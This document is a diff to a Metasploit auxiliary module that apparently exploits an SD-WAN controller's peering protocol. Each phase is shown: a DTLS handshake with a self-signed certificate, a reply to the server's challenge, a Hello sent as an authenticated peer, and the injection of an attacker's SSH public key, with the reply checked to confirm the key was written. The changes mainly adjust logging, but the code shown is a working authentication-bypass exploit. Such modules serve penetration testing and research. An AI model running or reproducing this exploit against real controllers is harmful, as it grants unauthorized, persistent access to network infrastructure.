@@ -119,7 +119,7 @@ class MetasploitModule < Msf::Auxiliary
   def phase1_dtls_handshake(silent: false)
     print_status('Phase 1: DTLS handshake with self-signed certificate') unless silent
 
-    load_openssl_ffi(silent: silent)
+    load_openssl_ffi
 
     # Generate self-signed certificate (in-memory, no files written to disk)
     cert_der, key_der = generate_self_signed_cert
@@ -180,7 +180,7 @@ class MetasploitModule < Msf::Auxiliary
   def phase2_receive_challenge(ssl, rbio, wbio, udp_sock, silent: false)
     print_status('Phase 2: Waiting for CHALLENGE from server') unless silent
 
-    hdr, body = recv_message(ssl, rbio, wbio, udp_sock, timeout: 15, silent: silent)
+    hdr, body = recv_message(ssl, rbio, wbio, udp_sock, timeout: 15)
     unless hdr
       print_error('No CHALLENGE received from server') unless silent
       return false
@@ -200,10 +200,10 @@ class MetasploitModule < Msf::Auxiliary
 
     # CHALLENGE_ACK_ACK body: verify_status=1, reserved=0
     ack_ack_body = [0x01, 0x00].pack('CC')
-    send_message(ssl, wbio, udp_sock, MSG_CHALLENGE_ACK_ACK, ack_ack_body, silent: silent)
+    send_message(ssl, wbio, udp_sock, MSG_CHALLENGE_ACK_ACK, ack_ack_body)
 
     # Server may respond with Hello or TEAR_DOWN
-    hdr, _body = recv_message(ssl, rbio, wbio, udp_sock, timeout: 5, silent: silent)
+    hdr, _body = recv_message(ssl, rbio, wbio, udp_sock, timeout: 5)
     if hdr
       mtype = hdr_msg_type(hdr)
       if mtype == MSG_HELLO
@@ -215,7 +215,7 @@ class MetasploitModule < Msf::Auxiliary
         print_status("Server responded with: #{msg_name(mtype)}") unless silent
       end
     else
-      vprint_status('No immediate response (server may be waiting for our Hello)') unless silent
+      print_warning('No immediate response (server may be waiting for our Hello)') unless silent
     end
 
     true
@@ -225,9 +225,9 @@ class MetasploitModule < Msf::Auxiliary
     print_status('Phase 4: Sending Hello as authenticated peer') unless silent
 
     hello_body = build_hello_body
-    send_message(ssl, wbio, udp_sock, MSG_HELLO, hello_body, silent: silent)
+    send_message(ssl, wbio, udp_sock, MSG_HELLO, hello_body)
 
-    hdr, _body = recv_message(ssl, rbio, wbio, udp_sock, timeout: 10, silent: silent)
+    hdr, _body = recv_message(ssl, rbio, wbio, udp_sock, timeout: 10)
     if hdr
       mtype = hdr_msg_type(hdr)
       if mtype == MSG_HELLO
@@ -236,7 +236,7 @@ class MetasploitModule < Msf::Auxiliary
       elsif mtype == MSG_TEAR_DOWN
         print_warning('TEAR_DOWN received after Hello') unless silent
       else
-        print_status("Server responded with: #{msg_name(mtype)}") unless silent
+        print_warning("Server responded with: #{msg_name(mtype)}") unless silent
       end
     else
       print_warning('No Hello response') unless silent
@@ -253,7 +253,7 @@ class MetasploitModule < Msf::Auxiliary
     # Build SSH key injection body (769 bytes)
     key_body = build_ssh_inject_body(ssh_pubkey)
 
-    send_message(ssl, wbio, udp_sock, MSG_VMANAGE_TO_PEER, key_body, silent: silent)
+    send_message(ssl, wbio, udp_sock, MSG_VMANAGE_TO_PEER, key_body)
 
     if datastore['SSH_PUBLIC_KEY_FILE']
       # If we are using an existing key supplied by the user, just show how to connect to the NETCONF service.
@@ -279,16 +279,16 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     # Check for response
-    hdr, _body = recv_message(ssl, rbio, wbio, udp_sock, timeout: 5, silent: silent)
+    hdr, _body = recv_message(ssl, rbio, wbio, udp_sock, timeout: 5)
     if hdr
       mtype = hdr_msg_type(hdr)
-      if mtype == MSG_TEAR_DOWN
-        print_warning('TEAR_DOWN after key inject - key may still have been written') unless silent
+      if mtype == MSG_REGISTER_TO_VMANAGE
+        print_status('Server responded with: REGISTER_TO_VMANAGE (key has been injected)') unless silent
       else
-        print_status("Server responded with: #{msg_name(mtype)}") unless silent
+        print_warning("Server responded with: #{msg_name(mtype)}") unless silent
       end
     else
-      vprint_status('No response to key injection (expected - server processes silently)') unless silent
+      print_warning('No response to key injection') unless silent
     end
   end
 
@@ -300,6 +300,7 @@ class MetasploitModule < Msf::Auxiliary
   MSG_CHALLENGE = 0x08
   MSG_CHALLENGE_ACK_ACK = 0x0A
   MSG_TEAR_DOWN = 0x0B
+  MSG_REGISTER_TO_VMANAGE = 0xD
   MSG_VMANAGE_TO_PEER = 0x0E
 
   DEV_VSMART = 3
@@ -342,14 +343,14 @@ class MetasploitModule < Msf::Auxiliary
     MSG_NAMES.fetch(type) { format('Unknown(0x%02X)', type) }
   end
 
-  def send_message(ssl, wbio, udp_sock, msg_type, body = ''.b, silent: false)
+  def send_message(ssl, wbio, udp_sock, msg_type, body = ''.b)
     header = build_header(msg_type)
     message = header + body
-    vprint_status("Sending #{msg_name(msg_type)} (#{message.bytesize} bytes)") unless silent
+    vprint_status("Sending #{msg_name(msg_type)} (#{message.bytesize} bytes)")
     dtls_send(ssl, wbio, udp_sock, message)
   end
 
-  def recv_message(ssl, rbio, wbio, udp_sock, timeout: 10, silent: false)
+  def recv_message(ssl, rbio, wbio, udp_sock, timeout: 10)
     data = dtls_recv(ssl, rbio, wbio, udp_sock, timeout: timeout)
     return [nil, nil] unless data
     return [nil, nil] if data.bytesize < 12
@@ -357,7 +358,7 @@ class MetasploitModule < Msf::Auxiliary
     hdr = data[0, 12]
     body = data[12..] || ''.b
     mtype = hdr_msg_type(hdr)
-    vprint_status("Received #{msg_name(mtype)} (#{data.bytesize} bytes)") unless silent
+    vprint_status("Received #{msg_name(mtype)} (#{data.bytesize} bytes)")
     [hdr, body]
   end
 
@@ -503,7 +504,7 @@ class MetasploitModule < Msf::Auxiliary
   MAX_HANDSHAKE_RETRIES = 10
   RECV_BUF_SIZE = 65_536
 
-  def load_openssl_ffi(silent: false)
+  def load_openssl_ffi
     return if @ffi_loaded
 
     libssl = load_native_lib('ssl')
@@ -538,7 +539,7 @@ class MetasploitModule < Msf::Auxiliary
     @recv_buf = Fiddle::Pointer.malloc(RECV_BUF_SIZE, Fiddle::RUBY_FREE)
     @ffi_loaded = true
 
-    vprint_status('OpenSSL FFI bindings loaded successfully') unless silent
+    vprint_status('OpenSSL FFI bindings loaded successfully')
   end
 
   def load_native_lib(name)
